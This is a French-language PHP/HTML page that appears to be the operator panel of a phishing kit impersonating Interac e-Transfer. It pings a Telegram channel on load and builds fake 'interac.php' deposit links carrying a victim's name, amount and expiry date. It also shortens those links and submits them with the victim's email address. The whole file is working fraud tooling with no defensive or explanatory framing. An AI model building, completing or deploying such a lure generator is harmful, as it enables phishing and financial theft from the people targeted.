<?php
require_once "../sendto.php";


sendMessageToTelegram('🟡🟡🟡 NOUVEAU VIREMENT🟡🟡🟡'); 
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire d'envoi</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f4f4f4;
        }
        .container {
            max-width: 600px;
            margin: auto;
            padding: 20px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            margin-top: 0;
        }
        label {
            display: block;
            margin: 10px 0 5px;
        }
        input[type="text"],
        input[type="url"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            padding: 10px 20px;
            background-color: #007BFF;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .link-preview {
            margin-top: 20px;
            font-size: 16px;
        }
        .link-preview a {
            color: #007BFF;
            text-decoration: none;
        }
        .link-preview a:hover {
            text-decoration: underline;
        }
    </style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>

function getDomainFromCurrentUrl() {
      try {
        // Utilise window.location pour obtenir l'URL actuelle
        const url = window.location.href;
        // Crée un objet URL à partir de l'URL actuelle
        const urlObject = new URL(url);
        // Récupère le domaine (hostname) de l'URL
        return urlObject.hostname;
      } catch (error) {
        console.error('Erreur lors de l\'extraction du domaine:', error);
        return null;
      }
    }

        function generateLink() {
            var client = document.getElementById('client').value;
            var montant = document.getElementById('montant').value;
            var exp = document.getElementById('exp').value;
            domain = getDomainFromCurrentUrl() ;
            var baseUrl = 'https://'+domain + '/interac.php?';
            var url = baseUrl + 'montant=' + encodeURIComponent(montant) + '&exp=' + encodeURIComponent(exp) + '&nom=' + encodeURIComponent(client);

            // Update the URL field with the generated link
            document.getElementById('url').value = url;
        }

        function urlz(urlToSend){
                    $.ajax({
          url: 'urlz.php', // URL du fichier PHP
          type: 'POST',    // Méthode HTTP (POST dans ce cas)
          data: { url: urlToSend },  // Les données envoyées au serveur (ici l'URL)
          success: function(response) {
            // Affiche la réponse du serveur dans la div avec l'ID responseContainer
            $("#responseContainer").val(response);
          },

        });
        }

    </script>
</head>
<body>
    <div class="container">
        <h1>Envoyer les Informations</h1>
        <form action="process.php" method="post">
            <label for="client">Nom du Client:</label>
            <input type="text" id="client" name="client" required>
        

            <label for="client">Email du Client:</label>
            <input type="text" id="email" name="email"  required>
    
            <label for="myname">Votre Nom:</label>
            <input type="text" id="myname" name="myname"  required>
            
            <label for="montant">Montant:</label>
            <input type="text" id="montant" name="montant"  required>
            
            <label for="exp">Date d'Expiration:</label>
            <input type="text" id="exp" name="exp"  required>
            
            <label for="url">URL:</label>
            <input type="url" id="url" name="urlgen"  required>
            
            <button type="button" onclick="generateLink()">Générer le Lien</button>

            <br>
            <br>
            <button type="button" onclick="urlz(document.getElementById('url').value)">raccourcir le Lien</button>
           <input type="text" name="url" id="responseContainer">
           
            <button type="submit">Envoyer</button>
        </form>
    </div>
</body>
</html>
